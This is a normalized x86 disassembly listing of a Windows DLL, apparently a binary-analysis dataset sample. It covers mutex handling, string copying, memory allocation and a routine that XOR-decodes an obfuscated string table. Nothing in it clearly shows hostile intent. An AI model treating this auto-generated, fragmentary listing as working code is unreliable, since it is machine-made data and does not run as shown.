je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
setne cl
push ebx
push edi
lea edx [ ebp - 0x60 ]
mov eax 0x5
add ecx 0x80000001
mov [ ebp - 0x68c ] ecx
call sub_10071f30
lea edx [ ebp - 0x688 ]
mov eax 0x1
call sub_10071f30
lea edx [ ebp - 0x680 ]
xor eax eax
call sub_10071f30
lea edx [ ebp - 0x67c ]
mov eax 0x4
call sub_10071f30
mov edi [ StrStrW@IAT ]
push edx
push esi
call edi
lea ecx [ ebp - 0x678 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x680 ]
xor edi edi
sub ebx ecx
lea ecx [ ecx ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop edi
pop ebx
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x684 ]
lea ecx [ ebp - 0x67c ]
push ecx
push edx
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_10050c60
test eax eax
je r-xdata
mov ecx [ ebp - 0x684 ]
push ecx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
jne r-xdata
lea eax [ ebp - 0x680 ]
push eax
call sub_10050c60
test eax eax
jne r-xdata
mov edi [ StrStrW@IAT ]
mov eax [ ebp - 0x684 ]
lea edx [ ebp - 0x67c ]
push edx
push eax
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0x688 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x678 ]
call sub_10050c60
test eax eax
jne r-xdata
lea ecx [ ebp - 0x680 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
lea eax [ ebp - 0x67c ]
push eax
call sub_10050c60
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10050c60
test eax eax
jne r-xdata
mov edx [ ebp - 0x68c ]
push edx
lea ecx [ ebp - 0x60 ]
call sub_10011ba0
add esp 0x4
pop edi
pop ebx
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10007720
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0xf4 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x82c ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x620 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ edi + 0x8 ]
lea eax [ ebp - 0x82c ]
push eax
lea ebx [ ebp - 0x418 ]
call sub_1006e090
add esp 0x4
test eax eax
je r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
lea ebx [ ebp - 0x828 ]
call sub_1005fae0
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov ecx [ edi + 0x14 ]
mov edi [ edi ]
xor ebx ebx
xor esi esi
xor eax eax
mov [ ebp - 0x830 ] dl
cmp edi ebx
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ecx
push eax
mov eax [ ebp - 0x830 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
mov ecx [ ebp - 0x82c ]
lea edx [ ebp - 0x418 ]
push edx
lea eax [ ebp - 0x620 ]
push eax
lea edx [ ebp - 0x828 ]
call sub_10066c10
test eax eax
jne r-xdata
mov eax edi
mov eax [ rw-data ]
mov ecx [ eax + 0xf4 ]
push ecx
mov [ eax + 0xe8 ] ebx
mov [ eax + 0xf0 ] ebx
mov [ eax + 0xec ] 0x1
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea esi [ eax + 0x8 ]
sub_10007870
push ebp
mov ebp esp
push 0xffffffff
push sub_10086b18
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xec ] bl
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_10021ec0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xc0 ] ebx
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] ebx
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] ebx
sub_10007910
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x8 ] eax
call sub_1007f580
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x8 ] 0x0
sub_10007950
push ebp
mov ebp esp
push ecx
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xd4 ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x6c ]
push esi
push eax
call edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
lea eax [ esi + 0x2 ]
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0xc
sub_100079e1
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp + 0x8 ]
add esp 0xc
fld [ ebp + 0x8 ]
pop ebp
retn
sub_10007a10
push ebp
mov ebp esp
mov eax [ ecx + 0x30 ]
push esi
mov esi [ eax ]
push edi
mov edi [ ebp + 0x8 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ edi ] esi
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10007a50
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0xf4 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ edi + 0x4 ]
mov [ ebp - 0x82c ] 0x0
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
lea edx [ ebp - 0x620 ]
push edx
call [ StrCpyW@IAT ]
mov esi [ edi + 0x8 ]
lea eax [ ebp - 0x82c ]
push eax
lea ebx [ ebp - 0x828 ]
call sub_1006e090
add esp 0x4
test eax eax
je r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x210 ]
push ecx
lea ebx [ ebp - 0x418 ]
call sub_1005fae0
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
mov edi [ edi + 0x18 ]
push edi
push eax
mov [ ebp - 0x830 ] dl
mov eax [ ebp - 0x830 ]
push eax
lea ecx [ ebp - 0x210 ]
push ecx
lea edx [ ebp - 0x418 ]
push edx
mov edx [ ebp - 0x82c ]
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x828 ]
xor ebx ebx
xor esi esi
call sub_1003c700
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov ecx [ eax + 0xf4 ]
push ecx
mov [ eax + 0xe8 ] ebx
mov [ eax + 0xf0 ] ebx
mov [ eax + 0xec ] 0x1
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
sub_10007b99
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100560bd
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10007bd0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084c50
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_10003cc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10007c6c
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001f53a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10007d10
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10032538
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10055e2a
push ecx
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_10007d60
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push ebx
xor ebx ebx
mov [ ebp - 0x220 ] eax
push esi
mov [ ebp - 0x218 ] ebx
xor eax eax
mov edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x27
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x6
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x18 ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0xc ] ax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x1d4 ]
mov eax 0x2b
mov [ ebp - 0x214 ] ebx
call sub_1002f620
lea eax [ ebp - 0x214 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xa1
call sub_1002f620
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0xd
mov [ ebp - 0x1e0 ] ebx
call sub_1002f620
lea edx [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x110 ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x91
call sub_1002f620
mov ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x214 ]
push eax
call esi
mov ecx [ ebp - 0x1e0 ]
push ecx
call esi
mov edx [ ebp - 0x200 ]
push edx
call esi
mov eax [ ebp - 0x1e8 ]
push eax
call esi
mov ecx [ ebp - 0x210 ]
push ecx
call esi
mov edx [ ebp - 0x1f0 ]
push edx
call esi
mov eax [ ebp - 0x208 ]
push eax
call esi
mov ecx [ ebp - 0x1f8 ]
push ecx
call esi
mov edx [ ebp - 0x20c ]
push edx
call esi
mov eax [ ebp - 0x1dc ]
push eax
call esi
mov ecx [ ebp - 0x1e4 ]
push ecx
call esi
mov edx [ ebp - 0x1ec ]
push edx
call esi
mov eax [ ebp - 0x1f4 ]
push eax
call esi
mov ecx [ ebp - 0x1fc ]
push ecx
call esi
mov edx [ ebp - 0x204 ]
push edx
call esi
mov ecx [ ebp - 0x8 ]
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x160 ]
mov eax 0xc9
mov [ ebp - 0x200 ] ebx
call sub_1002f620
lea ecx [ ebp - 0x200 ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x2d
call sub_1002f620
lea edx [ ebp - 0xd4 ]
mov eax 0xd4
mov [ ebp - 0x1e8 ] ebx
call sub_1002f620
lea eax [ ebp - 0x1e8 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x114
call sub_1002f620
lea edx [ ebp - 0xe8 ]
mov eax 0xe
mov [ ebp - 0x210 ] ebx
call sub_1002f620
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xb0
call sub_1002f620
lea edx [ ebp - 0x30 ]
mov eax 0x2e
mov [ ebp - 0x1f0 ] ebx
call sub_1002f620
lea ecx [ ebp - 0x1f0 ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x3a
call sub_1002f620
mov ebx 0x4
jmp r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0xcc
mov [ ebp - 0x208 ] ebx
call sub_1002f620
lea eax [ ebp - 0x208 ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xde
call sub_1002f620
lea edx [ ebp - 0x138 ]
mov eax 0x12c
mov [ ebp - 0x1f8 ] ebx
call sub_1002f620
lea edx [ ebp - 0x1f8 ]
push edx
lea eax [ ebp - 0x138 ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x126
call sub_1002f620
mov ebx 0x5
jmp r-xdata
lea edx [ ebp - 0x188 ]
mov eax 0x11b
mov [ ebp - 0x1d8 ] ebx
call sub_1002f620
lea ecx [ ebp - 0x1d8 ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x3e
call sub_1002f620
mov ebx 0x6
jmp r-xdata
lea edx [ ebp - 0x174 ]
mov eax 0x5f
mov [ ebp - 0x20c ] ebx
call sub_1002f620
lea eax [ ebp - 0x20c ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x1d8 ] r--data
lea edx [ ebp - 0x124 ]
mov eax 0x106
mov [ ebp - 0x1dc ] ebx
call sub_1002f620
lea edx [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x124 ]
push eax
call sub_1004e270
lea edx [ ebp - 0xc4 ]
mov eax 0x2a
mov [ ebp - 0x1e4 ] ebx
call sub_1002f620
lea ecx [ ebp - 0x1e4 ]
push ecx
push edx
call sub_1004e270
lea edx [ ebp - 0x1b8 ]
mov eax 0xd6
mov [ ebp - 0x1ec ] ebx
call sub_1002f620
lea eax [ ebp - 0x1ec ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x18
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x52
call sub_1002f620
lea edx [ ebp - 0x14c ]
mov eax 0x95
mov [ ebp - 0x1f4 ] ebx
mov [ ebp - 0x204 ] ebx
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x1fc ] ebx
call sub_1002f620
lea edx [ ebp - 0x1f4 ]
push edx
lea eax [ ebp - 0x14c ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xad
call sub_1002f620
lea edx [ ebp - 0x1a0 ]
mov eax 0x47
call sub_1002f620
lea ecx [ ebp - 0x204 ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
mov eax 0xc7
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xb1
call sub_1002f620
lea eax [ ebp - 0x21c ]
push eax
mov ecx edx
push ecx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xf9
call sub_1002f620
lea edx [ ebp - 0x9c ]
call sub_1002f620
lea edx [ ebp - 0xfc ]
mov eax 0x33
call sub_1002f620
lea edx [ ebp - 0x1fc ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xf4
call sub_1002f620
xor eax eax
mov ecx [ ebp - 0x21c ]
mov edx [ ebp - 0x204 ]
push ecx
mov ecx [ ebp - 0x1fc ]
push edx
mov edx [ ebp - 0x1f4 ]
push ecx
mov ecx [ ebp - 0x1ec ]
push edx
mov edx [ ebp - 0x1e4 ]
push ecx
mov ecx [ ebp - 0x1dc ]
push edx
mov edx [ ebp - 0x1d8 ]
push ecx
mov ecx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x1f8 ]
push ecx
mov ecx [ ebp - 0x208 ]
push edx
mov edx [ ebp - 0x1f0 ]
push ecx
mov ecx [ ebp - 0x210 ]
push edx
mov edx [ ebp - 0x1e8 ]
push ecx
mov ecx [ ebp - 0x214 ]
push edx
mov edx [ ebp - 0x218 ]
push ecx
mov ecx [ ebp - 0x1e0 ]
push edx
mov edx [ ebp - 0x200 ]
mov esi eax
call sub_10019a40
jmp r-xdata
push 0x58
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov eax 0x88
lea edx [ ebp - 0x7c ]
mov eax 0xc2
call sub_1002f620
mov ecx [ ebp - 0x220 ]
mov [ ecx ] eax
push edi
mov ecx eax
call sub_10010e00
test eax eax
je r-xdata
sub_10008350
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
lea ebx [ ebx ]
pop edi
mov eax esi
pop esi
pop ebp
retn
inc esi
cmp esi 0x96
jl r-xdata
mov eax [ esi * 4 + rw-data ]
push eax
push edi
call sub_10029cd9
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax 0x95
pop esi
pop ebp
retn
sub_1000838d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
cmp edi eax
jae r-xdata
sub edi eax
cmp [ ebp + 0x10 ] edi
jae r-xdata
push r--data
call sub_100651be
cmp esi ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push 0x0
push edi
call sub_100056ae
test al al
je r-xdata
push 0xffffffff
add edi eax
push edi
call sub_10054a5a
push [ ebp + 0xc ]
mov ecx esi
push 0x0
call sub_10054a5a
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea eax [ eax + edx * 2 ]
push eax
push ecx
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
sub_1000842a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10063a9a
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100405d2
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_10046777
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_10020fd7
pop ecx
test eax eax
jne r-xdata
call sub_100405d2
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_10046777
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_10060405
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_1003e323
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_1000858e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_1002f3fc
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001f91c
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1002f3fc
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f5ef
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1002f3fc
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_10008653
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100332b9
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10024808
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
